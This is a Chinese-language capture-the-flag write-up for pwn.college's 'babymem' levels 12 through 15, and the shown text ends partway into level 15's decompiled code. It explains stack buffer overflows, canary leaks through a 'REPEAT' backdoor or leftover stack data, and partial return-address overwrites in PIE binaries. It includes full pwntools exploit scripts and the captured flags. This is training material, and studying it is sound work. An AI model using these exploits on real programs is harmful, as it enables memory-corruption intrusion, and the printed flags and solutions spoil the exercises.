    cp_ -= 8LL;
  puts("Because the binary is position independent, you cannot know");
  puts("exactly where the win_authed() function is located.");
  puts("This means that it is not clear what should be written into the return address.\n");
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("You have chosen to send %lu bytes of input!\n", nbytes);
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    (char *)buf + nbytes,
    nbytes - 17);
  printf("Of these, you will overwrite %d bytes into the return address.\n", nbytes + (_DWORD)buf - rp_);
  puts("If that number is greater than 8, you will overwrite the entire return address.\n");
  puts("Overwriting the entire return address is fine when we know");
  puts("the whole address, but here, we only really know the last three nibbles.");
  puts("These nibbles never change, because pages are aligned to 0x1000.");
  puts("This gives us a workaround: we can overwrite the least significant byte");
  puts("of the saved return address, which we can know from debugging the binary,");
  puts("to retarget the return to main to any instruction that shares the other 7 bytes.");
  puts("Since that last byte will be constant between executions (due to page alignment),");
  puts("this will always work.");
  puts("If the address we want to redirect execution to is a bit farther away from");
  puts("the saved return address, and we need to write two bytes, then one of those");
  puts("nibbles (the fourth least-significant one) will be a guess, and it will be");
  puts("incorrect 15 of 16 times.");
  puts("This is okay: we can just run our exploit a few times until it works");
  puts("(statistically, ~50% chance after 11 times and ~90% chance after 36 times).");
  puts("One caveat in this challenge is that the win_authed() function must first auth:");
  puts("it only lets you win if you provide it with the argument 0x1337.");
  puts("Speifically, the win_authed() function looks something like:");
  puts("    void win_authed(int token)");
  puts("    {");
  puts("      if (token != 0x1337) return;");
  puts("      puts(\"You win! Here is your flag: \");");
  puts("      sendfile(1, open(\"/flag\", 0), 0, 256);");
  puts("      puts(\"\");");
  puts("    }");
  puts(byte_3E5B);
  puts("So how do you pass the check? There *is* a way, and we will cover it later,");
  puts("but for now, we will simply bypass it! You can overwrite the return address");
  puts("with *any* value (as long as it points to executable code), not just the start");
  puts("of functions. Let's overwrite past the token check in win!\n");
  puts("To do this, we will need to analyze the program with objdump, identify where");
  puts("the check is in the win_authed() function, find the address right after the check,");
  puts("and write that address over the saved return address.\n");
  puts("Go ahead and find this address now. When you're ready, input a buffer overflow");
  printf(
    "that will overwrite the saved return address (at %p, %d bytes into the buffer)\n",
    (const void *)rp_,
    rp_ - (_DWORD)buf);
  puts("with the correct value.\n");
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v10 = read(0, buf, nbytes);
  if ( v10 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v10);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the canary is stored at %p.\n", (const void *)cp_);
  printf("- the canary value is now %p.\n", *(const void **)cp_);
  printf("- the address of win_authed() is %p.\n", win_authed);
  putchar(10);
  puts("If you have managed to overwrite the return address with the correct value,");
  puts("challenge() will jump straight to win_authed() when it returns.");
  printf("Let's try it now!\n\n");
  if ( (unsigned __int64)buf + v10 > rp_ + 2 )
  {
    puts("WARNING: You sent in too much data, and overwrote more than two bytes of the address.");
    puts("         This can still work, because I told you the correct address to use for");
    puts("         this execution, but you should not rely on that information.");
    puts("         You can solve this challenge by only overwriting two bytes!");
    puts("         ");
  }
  printf("You said: %s\n", (const char *)buf);
  puts("This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()");
  puts("call to see the hidden backdoor!");
  if ( strstr((const char *)buf, "REPEAT") )
  {
    puts("Backdoor triggered! Repeating challenge()");
    return challenge(v9, v8, v7);
  }
  else
  {
    puts("Goodbye!");
    return 0LL;
  }
}
```

虽说是一道蛮综合的题，不过我感觉不算难，就简单说说思路好了。这个程序的问题就在于我们可以提供任意输入溢出 `buf`，覆盖返回地址。但是这里有一个 canary 保护需要绕过。

我们注意到有一条 `printf` 会输出我们栈上的内容，那我们是不是可以填满整个 `buf`，直到 canary 为止？这样 `printf` 就会把 canary 泄漏出来。结合 `printf` 判断字符串结束的机制，以及 `canary` 固定以 `\x00` 结尾，我们需要用一个任意字符填上这个空，这样就把 canary 泄漏出来了。

`strstr` 函数的定义如下，它会从 `haystack` 中搜索 `needle` 第一次出现的位置，返回这个位置的指针。如果没匹配到，则返回 `NULL`。

```c
// attributes: thunk
char *strstr(const char *haystack, const char *needle)
{
  return strstr(haystack, needle);
}
```

> 对于这个函数最好还知道：
>
> - 如果 `needle` 是空字符串，则 `strstr` 总是返回 `haystack` 的指针。
> - `strstr` 是大小写敏感的，`strcasestr` 大小写不敏感。

> 还有 `strchr` 返回字符串中第一个匹配的字符的指针。`memcmp` 比较指定内存区域的内容，适用于更通用的场景，`strstr` 则是处理简单字符串匹配问题的实用工具，适用于无需高性能优化的场景。
>
> 说这些只是我觉得了解下说不定会有帮助，要是哪天比赛碰上了，到时候能不能查还说不准…… ~（想起了乔布斯说的：美妙人生，把点连成线）~
>
> ~好吧，其实主要是 `ChatGPT` 都说了，那我可不得好好利用一下，啰嗦两句？xD~

`if ( strstr((const char *)buf, "REPEAT") )` 判断输入中是否包含 `REPEAT`，如果包含的话就会再次调用 `challenge`。因为是同一个进程再次调用 `challenge`，所以 canary 的值不会改变，这就让我们泄漏出来的 canary 派上用场了。

绕过这个 `win_authed` 检测没啥好说的了吧，返回地址重定位到内部代码块开始执行即可。

```c ins={10} del={8} collapse={1-4, 14-35}
void __fastcall win_authed(int a1)
{
  int *v1; // rax
  char *v2; // rax
  int *v3; // rax
  char *v4; // rax

  if ( a1 == 4919 )
  {
    puts("You win! Here is your flag:");
    flag_fd_5715 = open("/flag", 0);
    if ( flag_fd_5715 < 0 )
    {
      v1 = __errno_location();
      v2 = strerror(*v1);
      printf("\n  ERROR: Failed to open the flag -- %s!\n", v2);
      if ( geteuid() )
      {
        puts("  Your effective user id is not 0!");
        puts("  You must directly run the suid binary in order to have the correct permissions!");
      }
      exit(-1);
    }
    flag_length_5716 = read(flag_fd_5715, &flag_5714, 0x100uLL);
    if ( flag_length_5716 <= 0 )
    {
      v3 = __errno_location();
      v4 = strerror(*v3);
      printf("\n  ERROR: Failed to read the flag -- %s!\n", v4);
      exit(-1);
    }
    write(1, &flag_5714, flag_length_5716);
    puts("\n");
  }
}
```

当时这题困扰住我的倒不是如何构造攻击链的问题，而是写 exp 的问题……脑子抽了企图在 `return challenge(v9, v8, v7);` 这里返回到 `win_authed`，但是这是写死在代码段的，而且权限是 `r-xp`，小小栈溢出岂能覆盖？后来发现整体思路还少了一步，应该是先触发一次后门泄漏 canary，然后第二次执行的时候就不需要触发后门了，直接覆盖 `challenge` 的返回地址就好了。

随便扯两句心里话吧。踩了不少坑，希望以后可以争取做到更严谨完善的分析。还有就是动态调试很重要哦～感觉自己多少还是有一点调试恐惧症 LMAO

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, pause, process, random, remote

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-12-0"
HOST, PORT = "pwn.college", 1337

gdbscript = """
b *challenge+1339
b *challenge+1821
c
"""


def to_hex_bytes(data):
    return "".join(f"\\x{byte:02x}" for byte in data)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


backdoor = b"REPEAT "
backdoor_trigger = b"".ljust(0x12, b"A") + backdoor
padding_to_canary = b"".ljust(0x18, b"A")
padding_to_ret = b"".ljust(0x8, b"A")
fixed_offset = b"\xe0"
possible_bytes = [bytes([i]) for i in range(0x03, 0x103, 0x10)]


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()

        target.sendlineafter(b"Payload size: ", payload_size)
        target.sendafter(b"Send your payload", payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def leak_canary(target):
    try:
        send_payload(target, backdoor_trigger)
        target.recvuntil(backdoor)

        canary = b"\x00" + target.recv(0x7)
        log.success(f"Canary: {to_hex_bytes(canary)}")

        return canary
    except Exception as e:
        log.exception(f"An error occurred while leaking canary: {e}")


def construct_payload(target):
    canary = leak_canary(target)

    payload = padding_to_canary
    payload += canary
    payload += padding_to_ret
    payload += fixed_offset + random.choice(possible_bytes)

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall()

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    while True:
        target = launch()

        try:
            payload = construct_payload(target)

            if attack(target, payload):
                log.success("Success! Exiting...")

                pause()
                exit()
            else:
                target.close()
                target = launch()
        except Exception as e:
            log.exception(f"An error occurred in main loop: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{YkuEQhg7aejOObKgMu4MNlIgI-S.0VMxMDL5cTNxgzW}`

# Level 12.1

## Information

- Category: Pwn

## Description

> Defeat a stack canary in a PIE binary by utilizing a bug left in the binary.

## Write-up

和上题一样啊，不说了。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, pause, process, random, remote

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-12-1"
HOST, PORT = "pwn.college", 1337

gdbscript = """
b *challenge+298
c
"""


def to_hex_bytes(data):
    return "".join(f"\\x{byte:02x}" for byte in data)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


backdoor = b"REPEAT "
backdoor_trigger = b"".ljust(0x82, b"A") + backdoor
padding_to_canary = b"".ljust(0x88, b"A")
padding_to_ret = b"".ljust(0x8, b"A")
fixed_offset = b"\xcd"
possible_bytes = [bytes([i]) for i in range(0x03, 0x103, 0x10)]


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()

        target.sendlineafter(b"Payload size: ", payload_size)
        target.sendafter(b"Send your payload", payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def leak_canary(target):
    try:
        send_payload(target, backdoor_trigger)
        target.recvuntil(backdoor)

        canary = b"\x00" + target.recv(0x7)
        log.success(f"Canary: {to_hex_bytes(canary)}")

        return canary
    except Exception as e:
log.exception(f"An error occurred while leaking canary: {e}")


def construct_payload(target):
    canary = leak_canary(target)

    payload = padding_to_canary
    payload += canary
    payload += padding_to_ret
    payload += fixed_offset + random.choice(possible_bytes)

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall()

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    while True:
        target = launch()

        try:
            payload = construct_payload(target)

            if attack(target, payload):
                log.success("Success! Exiting...")

                pause()
                exit()
            else:
                target.close()
                target = launch()
        except Exception as e:
            log.exception(f"An error occurred in main loop: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{Q8RGfsaRLXQyi0mLIgR3c7-_jYK.0lMxMDL5cTNxgzW}`

# Level 13.0

## Information

- Category: Pwn

## Description

> Leak data left behind unintentionally by utilizing clever payload construction.

## Write-up

```c del={7-8}
int verify_flag()
{
  int v0; // eax
  _BYTE v2[279]; // [rsp+79h] [rbp-117h] BYREF

  *(_QWORD *)&v2[271] = __readfsqword(0x28u);
  v0 = open("/flag", 0);
  read(v0, v2, 0x100uLL);
  puts(
    "This challenge reads the flag file to verify it. Do you think this might leave traces of the flag around afterwards?\n");
  return printf("The flag was read into address %p.\n\n", v2);
}
```

这题没啥好说的吧，完全就是 `verify_flag` 把 `flag` 读到栈上了，然后我们用垃圾数据填充到 `flag` 头就好了，`printf("You said: %.360s\n", (const char *)buf);` 会输出一切……

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-13-0"
HOST, PORT = "pwn.college", 1337

gdbscript = """
b *verify_flag+75
b *challenge+1429
b *challenge+1932
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


padding_to_flag = b"".ljust(0x59, b"A")


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()

        target.sendlineafter(b"Payload size: ", payload_size)
        target.sendafter(b"Send your payload", payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    payload = padding_to_flag

    return payload


def leak_flag(target, payload):
    try:
        send_payload(target, payload)

        target.recvuntil(b"pwn.college{")

        flag = b"pwn.college{" + target.recvuntil(b"}")

        log.success(f"Flag successfully leaked: {flag}")
    except Exception as e:
        log.exception(f"An error occurred while performing leak_flag: {e}")


def main():
    target = launch(debug=False)

    payload = construct_payload()

    leak_flag(target, payload)


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{YkKrgg8qd3Vyt4OOrpBqwsAEJ2g.01MxMDL5cTNxgzW}`

# Level 13.1

## Information

- Category: Pwn

## Description

> Leak data left behind unintentionally by utilizing clever payload construction.

## Write-up

和上题一样，重新计算一下偏移就好了。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-13-1"
HOST, PORT = "pwn.college", 1337

gdbscript = """
b *verify_flag+75
b *challenge+168
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


padding_to_flag = b"".ljust(0x8A, b"A")


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()

        target.sendlineafter(b"Payload size: ", payload_size)
        target.sendafter(b"Send your payload", payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    payload = padding_to_flag

    return payload


def leak_flag(target, payload):
    try:
        send_payload(target, payload)

        target.recvuntil(b"pwn.college{")

        flag = b"pwn.college{" + target.recvuntil(b"}")

        log.success(f"Flag successfully leaked: {flag}")
    except Exception as e:
        log.exception(f"An error occurred while performing leak_flag: {e}")


def main():
    target = launch(debug=False)

    payload = construct_payload()

    leak_flag(target, payload)


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{gscSxVngZ4uaJ8tU3A-fhqwrLIM.0FNxMDL5cTNxgzW}`

# Level 14.0

## Information

- Category: Pwn

## Description

> Leak data left behind unintentionally to defeat a stack canary in a PIE binary.

## Write-up

```c ins={145-149} del={111, 142} collapse={1-107, 115-138, 153-155}
__int64 __fastcall challenge(unsigned int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  __int64 v6; // [rsp+0h] [rbp-1E0h] BYREF
  __int64 v7; // [rsp+8h] [rbp-1D8h]
  __int64 v8; // [rsp+10h] [rbp-1D0h]
  unsigned int v9; // [rsp+1Ch] [rbp-1C4h]
  int v10; // [rsp+2Ch] [rbp-1B4h]
  size_t nbytes; // [rsp+30h] [rbp-1B0h] BYREF
  void *buf; // [rsp+38h] [rbp-1A8h]
  char v13; // [rsp+40h] [rbp-1A0h] BYREF
  unsigned __int64 v14; // [rsp+1D8h] [rbp-8h]
  __int64 savedregs; // [rsp+1E0h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+1E8h] [rbp+8h] BYREF

  v9 = a1;
  v8 = a2;
  v7 = a3;
  v14 = __readfsqword(0x28u);
  buf = &v13;
  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  puts("However... An important initialization step was missed.");
  puts("Use this to your advantage!");
  puts(byte_3284);
  sp_ = (__int64)&v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)&v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 407);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is no \"win\" variable.");
  puts("You will need to force the program to execute the win_authed() function");
  puts("by directly overflowing into the stored return address back to main,");
  printf(
    "which is stored at %p, %d bytes after the start of your input buffer.\n",
    (const void *)rp_,
    rp_ - (_DWORD)buf);
  printf(
    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
    rp_ - (_DWORD)buf + 8,
    407);
  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_DWORD)buf - 407);
  puts("and 8 that will overwrite the return address).\n");
  cp_ = bp_;
  cv_ = __readfsqword(0x28u);
  while ( *(_QWORD *)cp_ != cv_ )
    cp_ -= 8LL;
  puts("Because the binary is position independent, you cannot know");
  puts("exactly where the win_authed() function is located.");
  puts("This means that it is not clear what should be written into the return address.\n");
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("You have chosen to send %lu bytes of input!\n", nbytes);
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    (char *)buf + nbytes,
    nbytes - 407);
  printf("Of these, you will overwrite %d bytes into the return address.\n", nbytes + (_DWORD)buf - rp_);
  puts("If that number is greater than 8, you will overwrite the entire return address.\n");
  puts("Overwriting the entire return address is fine when we know");
  puts("the whole address, but here, we only really know the last three nibbles.");
  puts("These nibbles never change, because pages are aligned to 0x1000.");
  puts("This gives us a workaround: we can overwrite the least significant byte");
  puts("of the saved return address, which we can know from debugging the binary,");
  puts("to retarget the return to main to any instruction that shares the other 7 bytes.");
  puts("Since that last byte will be constant between executions (due to page alignment),");
  puts("this will always work.");
  puts("If the address we want to redirect execution to is a bit farther away from");
  puts("the saved return address, and we need to write two bytes, then one of those");
  puts("nibbles (the fourth least-significant one) will be a guess, and it will be");
  puts("incorrect 15 of 16 times.");
  puts("This is okay: we can just run our exploit a few times until it works");
  puts("(statistically, ~50% chance after 11 times and ~90% chance after 36 times).");
  puts("One caveat in this challenge is that the win_authed() function must first auth:");
  puts("it only lets you win if you provide it with the argument 0x1337.");
  puts("Speifically, the win_authed() function looks something like:");
  puts("    void win_authed(int token)");
  puts("    {");
  puts("      if (token != 0x1337) return;");
  puts("      puts(\"You win! Here is your flag: \");");
  puts("      sendfile(1, open(\"/flag\", 0), 0, 256);");
  puts("      puts(\"\");");
  puts("    }");
  puts(byte_3284);
  puts("So how do you pass the check? There *is* a way, and we will cover it later,");
  puts("but for now, we will simply bypass it! You can overwrite the return address");
  puts("with *any* value (as long as it points to executable code), not just the start");
  puts("of functions. Let's overwrite past the token check in win!\n");
  puts("To do this, we will need to analyze the program with objdump, identify where");
  puts("the check is in the win_authed() function, find the address right after the check,");
  puts("and write that address over the saved return address.\n");
  puts("Go ahead and find this address now. When you're ready, input a buffer overflow");
  printf(
    "that will overwrite the saved return address (at %p, %d bytes into the buffer)\n",
    (const void *)rp_,
    rp_ - (_DWORD)buf);
  puts("with the correct value.\n");
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v10 = read(0, buf, nbytes);
  if ( v10 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v10);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the canary is stored at %p.\n", (const void *)cp_);
  printf("- the canary value is now %p.\n", *(const void **)cp_);
  printf("- the address of win_authed() is %p.\n", win_authed);
  putchar(10);
  puts("If you have managed to overwrite the return address with the correct value,");
  puts("challenge() will jump straight to win_authed() when it returns.");
  printf("Let's try it now!\n\n");
  if ( (unsigned __int64)buf + v10 > rp_ + 2 )
  {
    puts("WARNING: You sent in too much data, and overwrote more than two bytes of the address.");
    puts("         This can still work, because I told you the correct address to use for");
    puts("         this execution, but you should not rely on that information.");
    puts("         You can solve this challenge by only overwriting two bytes!");
    puts("         ");
  }
  printf("You said: %.407s\n", (const char *)buf);
  puts("This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()");
  puts("call to see the hidden backdoor!");
  if ( strstr((const char *)buf, "REPEAT") )
  {
    puts("Backdoor triggered! Repeating challenge()");
    return challenge(v9, v8, v7);
  }
  else
  {
    puts("Goodbye!");
    return 0LL;
  }
}
```

这题就是前面几个 level 的结合体。唯一的不同之处在于，这次 canary 和其它一些数据以残留数据的形式出现在 `challenge` 创建的栈帧内部，我们只要把这个残留的 canary 泄漏出来就好了。至于 `challenge` 本身的 canary，我们泄漏不了。所以其实出题人的本意就是想让我们泄漏栈上的残留数据，为此对泄漏 `challenge` 原本的 canary 的途径做了限制。

至于我是如何发现残留数据这一事实的，是通过动态调试，凭借对 canary 敏锐的洞察力发现的 LMAO。咱就是说对数据的敏感度也很重要哦～

为了避免这种残留数据/栈帧复用的问题，我们每次分配完栈空间后都应该通过类似 `memset` 的方法清空栈内容才对。所以，如果没有 `memset` 的，就可以想想会不会有泄漏残留数据的可能了。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, pause, process, random, remote

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-14-0"
HOST, PORT = "pwn.college", 1337

gdbscript = """
c
"""


def to_hex_bytes(data):
    return "".join(f"\\x{byte:02x}" for byte in data)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


backdoor = b"REPEAT "
backdoor_trigger = b"".ljust(0x82, b"A") + backdoor
padding_to_canary = b"".ljust(0x198, b"A")
padding_to_ret = b"".ljust(0x8, b"A")
fixed_offset = b"\xd4"
possible_bytes = [bytes([i]) for i in range(0xF, 0x10F, 0x10)]


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()

        target.sendlineafter(b"Payload size: ", payload_size)
        target.sendafter(b"Send your payload", payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def leak_canary(target):
    try:
        send_payload(target, backdoor_trigger)
        target.recvuntil(backdoor)

        canary = b"\x00" + target.recv(0x7)
        log.success(f"Canary: {to_hex_bytes(canary)}")

        return canary
    except Exception as e:
        log.exception(f"An error occurred while leaking canary: {e}")


def construct_payload(target):
    canary = leak_canary(target)

    payload = padding_to_canary
    payload += canary
    payload += padding_to_ret
    payload += fixed_offset + random.choice(possible_bytes)

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall()

        return b"You win!" in response
    except Exception as e:
        log.exception(f"An error occurred while performing leak_flag: {e}")


def main():
    while True:
        target = launch(debug=False)

        try:
            payload = construct_payload(target)

            if attack(target, payload):
                log.success("Success! Exiting...")

                pause()
                exit()
            else:
                target.close()
                target = launch()
        except Exception as e:
            log.exception(f"An error occurred in main loop: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{chm7VMiV6dZ3oBKDhVUhtvXg3kb.0VNxMDL5cTNxgzW}`

# Level 14.1

## Information

- Category: Pwn

## Description

> Leak data left behind unintentionally to defeat a stack canary in a PIE binary.

## Write-up

和上题一样，重新找一下偏移和返回地址就好啦。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, pause, process, random, remote

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-14-1"
HOST, PORT = "pwn.college", 1337

gdbscript = """
b *challenge+168
c
"""


def to_hex_bytes(data):
    return "".join(f"\\x{byte:02x}" for byte in data)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


backdoor = b"REPEAT "
backdoor_trigger = b"".ljust(0x72, b"A") + backdoor
padding_to_canary = b"".ljust(0x188, b"A")
padding_to_ret = b"".ljust(0x8, b"A")
fixed_offset = b"\x7d"
possible_bytes = [bytes([i]) for i in range(0x8, 0x108, 0x10)]


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()

        target.sendlineafter(b"Payload size: ", payload_size)
        target.sendafter(b"Send your payload", payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def leak_canary(target):
    try:
        send_payload(target, backdoor_trigger)
        target.recvuntil(backdoor)

        canary = b"\x00" + target.recv(0x7)
        log.success(f"Canary: {to_hex_bytes(canary)}")

        return canary
    except Exception as e:
        log.exception(f"An error occurred while leaking canary: {e}")


def construct_payload(target):
    canary = leak_canary(target)

    payload = padding_to_canary
    payload += canary
    payload += padding_to_ret
    payload += fixed_offset + random.choice(possible_bytes)

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall()

        return b"You win!" in response
    except Exception as e:
        log.exception(f"An error occurred while performing leak_flag: {e}")


def main():
    while True:
        target = launch(debug=False)

        try:
            payload = construct_payload(target)

            if attack(target, payload):
                log.success("Success! Exiting...")

                pause()
                exit()
            else:
                target.close()
                target = launch()
        except Exception as e:
            log.exception(f"An error occurred in main loop: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{E_7686TOh__Z7NZeXfOPaMP5YfJ.0lNxMDL5cTNxgzW}`

# Level 15.0

## Information

- Category: Pwn

## Description

> Defeat a stack canary in a PIE binary by utilizing a network-style fork server in the target binary.

## Write-up

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int optval; // [rsp+24h] [rbp-101Ch] BYREF
  int fd; // [rsp+28h] [rbp-1018h]
  int v7; // [rsp+2Ch] [rbp-1014h]
  sockaddr addr; // [rsp+30h] [rbp-1010h] BYREF
  unsigned __int64 v9; // [rsp+1038h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts("This challenge is listening for connections on TCP port 1337.\n");
  puts("The challenge supports unlimited sequential connections.\n");
  fd = socket(2, 1, 0);
  optval = 1;
  setsockopt(fd, 1, 2, &optval, 4u);
  addr.sa_family = 2;
  *(_DWORD *)&addr.sa_data[2] = 0;
  *(_WORD *)addr.sa_data = htons(0x539u);
  bind(fd, &addr, 0x10u);
  listen(fd, 1);
  while ( 1 )
  {
    v7 = accept(fd, 0LL, 0LL);
    if ( !fork() )
      break;
    close(v7);
    wait(0LL);
  }
  dup2(v7, 0);
  dup2(v7, 1);
  dup2(v7, 2);
  close(fd);
  close(v7);
  challenge((unsigned int)argc, argv, envp);
  puts("### Goodbye!");
  return 0;
}
```

观察这个 `main` 函数我们可知，它所做的大致就是持续监听 `1337` 端口，连上了就创建一个子进程执行 `challenge`。

```c del={130} collapse={1-126, 134-163}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  _QWORD v6[3]; // [rsp+0h] [rbp-C0h] BYREF
  int v7; // [rsp+1Ch] [rbp-A4h]
  int v8; // [rsp+2Ch] [rbp-94h]
  size_t nbytes; // [rsp+30h] [rbp-90h] BYREF
  void *buf; // [rsp+38h] [rbp-88h]
  _QWORD v11[13]; // [rsp+40h] [rbp-80h] BYREF
  __int16 v12; // [rsp+A8h] [rbp-18h]
  unsigned __int64 v13; // [rsp+B8h] [rbp-8h]
  __int64 savedregs; // [rsp+C0h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+C8h] [rbp+8h] BYREF

  v7 = a1;
  v6[2] = a2;
  v6[1] = a3;
  v13 = __readfsqword(0x28u);
  memset(v11, 0, sizeof(v11));
  v12 = 0;
  buf = v11;
  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
